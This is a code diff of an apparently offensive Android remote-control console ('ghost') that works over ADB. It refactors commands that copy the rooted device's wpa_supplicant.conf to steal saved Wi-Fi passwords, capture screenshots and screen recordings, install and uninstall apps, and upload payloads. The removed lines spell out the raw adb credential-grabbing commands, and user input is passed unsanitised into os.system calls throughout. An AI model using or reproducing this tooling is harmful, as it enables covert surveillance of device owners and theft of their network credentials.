@@ -33,8 +33,6 @@ S = '\033[1;32m[+] \033[0m'
 W = '\033[1;33m[!] \033[0m'
 E = '\033[1;31m[-] \033[0m'
 
-g = os.environ['HOME'] + '/ghost'
-
 def autocomplete(text, state):
     import readline
     line = readline.get_line_buffer()
@@ -197,14 +195,11 @@ def main():
                         if len(con.split()) < 2:
                             print("Usage: wgrabber <local_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
                             if os.path.isdir(con.split()[1]):
                                 if os.path.exists(con.split()[1]):
                                     rp = os.path.split(con.split()[1])[1]
                                     print(G+"Grabbing WPA Supplicant...")
-                                    os.system("adb shell su 0 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/' > /dev/null")
-                                    os.system("adb pull /sdcard/wpa_supplicant.conf "+con.split()[1]+"/wpa_supplicant.conf")
+                                    os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -w "+con.split()[1]+"/wpa_supplicant.conf")
                                     print(G+"Saving wpa_supplicant.conf...")
                                     time.sleep(1)
                                     print(S+"Saved to "+con.split()[1]+"/wpa_supplicant.conf!")
@@ -216,8 +211,7 @@ def main():
                                     if os.path.isdir(rp):
                                         rp = os.path.split(con.split()[1])[1]
                                         print(G+"Grabbing WPA Supplicant...")
-                                        os.system("adb shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/' > /dev/null")
-                                        os.system("adb pull /sdcard/wpa_supplicant.conf "+con.split()[1])
+                                        os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -w "+con.split()[1])
                                         print(G+"Saving wpa_supplicant.conf...")
                                         time.sleep(1)
                                         print(S+"Saved to "+con.split()[1]+"!")
@@ -225,19 +219,14 @@ def main():
                                         print(E+"Error: "+rp+": not a directory!")
                                 else:
                                     print(E+"Local directory: "+rp+": does not exists!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     elif con[:10] == "screenshot":
                         if len(con.split()) < 2:
                             print("Usage: screenshot <local_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
                             if os.path.isdir(con.split()[1]):
                                 if os.path.exists(con.split()[1]):
                                     print(G+"Taking screenshot...")
-                                    os.system("adb shell screencap /sdcard/screen.png > /dev/null")
-                                    os.system("adb pull /sdcard/screen.png "+con.split()[1]+"/screen.png > /dev/null")
+                                    os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s "+con.split()[1]+"/screen.png")
                                     print(G+"Saving to "+con.split()[1]+"/screen.png...")
                                     time.sleep(1)
                                     print(S+"Saved to "+con.split()[1]+"/screen.png!")
@@ -249,8 +238,7 @@ def main():
                                     if os.path.isdir(rp):
                                         rp = os.path.split(con.split()[1])[1]
                                         print(G+"Taking screenshot...")
-                                        os.system("adb shell screencap /sdcard/screen.png > /dev/null")
-                                        os.system("adb pull /sdcard/screen.png "+con.split()[1]+" > /dev/null")
+                                        os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s "+con.split()[1])
                                         print(G+"Saving to "+con.split()[1]+"...")
                                         time.sleep(1)
                                         print(S+"Saved to "+con.split()[1]+"!")
@@ -258,20 +246,15 @@ def main():
                                         print(E+"Error: "+rp+": not a directory!")
                                 else:
                                     print(E+"Local directory: "+rp+": does not exists!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     elif con[:9] == "screenrec":
                         if len(con.split()) < 2:
                             print("Usage: screenrec <local_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
                             if os.path.isdir(con.split()[1]):
                                 if os.path.exists(con.split()[1]):
                                     print(G+"Recording screen...")
                                     print(G+"Press Ctrl-C to stop.")
-                                    os.system("adb shell screenrecord /sdcard/screen.mp4 > /dev/null")
-                                    os.system("adb pull /sdcard/screen.mp4 "+con.split()[1]+"/screen.mp4 > /dev/null")
+                                    os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -r "+con.split()[1]+"/screen.mp4")
                                     print(G+"Saving to "+con.split()[1]+"/screen.mp4...")
                                     time.sleep(1)
                                     print(S+"Saved to "+con.split()[1]+"/screen.mp4!")
@@ -284,8 +267,7 @@ def main():
                                         rp = os.path.split(con.split()[1])[1]
                                         print(G+"Recording screen...")
                                         print(G+"Press Ctrl-C to stop.")
-                                        os.system("adb shell screenrecord /sdcard/screen.mp4 > /dev/null")
-                                        os.system("adb pull /sdcard/screen.mp4 "+con.split()[1]+" > /dev/null")
+                                        os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s "+con.split()[1])
                                         print(G+"Saving to "+con.split()[1]+"...")
                                         time.sleep(1)
                                         print(S+"Saved to "+con.split()[1]+"!")
@@ -293,8 +275,6 @@ def main():
                                         print(E+"Error: "+rp+": not a directory!")
                                 else:
                                     print(E+"Local directory: "+rp+": does not exists!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     elif con[:9] == "uninstall":
                         if con[10:] == "":
                             print("Usage: uninstall <application>")
@@ -308,7 +288,7 @@ def main():
                                 else:
                                     turn = 0
                             if turn == "1":
-                                os.system("adb uninstall "+con[10:]+" > /dev/null")
+                                os.system("chmod +x core/apps/uninstall.sh && core/apps/uninstall.sh "+con[10:])
                             else:
                                 print(E+"No such application!")
                     elif con[:6] == "launch":
@@ -324,7 +304,7 @@ def main():
                                 else:
                                     turn = 0
                             if turn == "1":
-                                os.system("chmod +x core/launch.sh && core/launch.sh "+con[7:])
+                                os.system("chmod +x core/apps/launch.sh && core/apps/launch.sh "+con[7:])
                             else:
                                 print(E+"No such application!")
                     elif con == "apps":
@@ -338,18 +318,23 @@ def main():
                             print("Usage: install <local_path>")
                         else:
                             if os.path.exists(con[8:]):
-                                print(G+"Installing "+con[8:]+"...")
-                                os.system("adb install "+con[8:]+" > /dev/null")
-                                print(S+"Succcessfully installed!")
+                                ext = os.path.splitext(con[8:])
+                                if os.path.isdir(con[8:]):
+                                    print(E+"Error: "+con[8:]+": not a file!")
+                                else:
+                                    if ext == ".apk":
+                                        print(G+"Installing "+con[8:]+"...")
+                                        os.system("chmod +x core/apps/install.sh && core/apps/install.sh "+con[8:])
+                                        print(S+"Succcessfully installed!")
+                                    else:
+                                        print(E+"Error: "+con[8:]+": not an apk file!")
                             else:
                                 print(E+"Local file: "+con[8:]+": does not exist!")
                     elif con[:8] == "download":
                         if len(con.split()) < 3:
                             print("Usage: download <remote_path> <local_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
-                            chk = os.popen("chmod +x ~/ghost/data/check/check.sh && ~/ghost/data/check/check.sh "+con.split()[1]).read()
+                            chk = os.popen("chmod +x data/check/check.sh && data/check/check.sh "+con.split()[1]).read()
                             if chk == "0\n":
                                 if os.path.isdir(con.split()[2]):
                                     if os.path.exists(con.split()[2]):
@@ -370,14 +355,10 @@ def main():
                                         print(E+"Local directory: "+rp+": does not exists!")
                             else:
                                 print(E+"Remote file: "+con.split()[1]+": does not exist!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     elif con[:6] == "upload":
                         if len(con.split()) < 3:
                             print("Usage: upload <local_path> <remote_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
                             if os.path.exists(con.split()[1]):
                                 if os.path.isdir(con.split()[1]):
                                     print(E+"Error: "+rp+": not a file!")
@@ -390,8 +371,6 @@ def main():
                                     os.system("chmod +x data/payloads/upload && data/payloads/upload "+con.split()[1]+" "+con.split()[2]+" "+rp+" "+pr+" "+lrp)
                             else:
                                 print(E+"Local file: "+con.split()[1]+": does not exist!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     else:
                         print(E+"Unrecognized command!")
                     con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
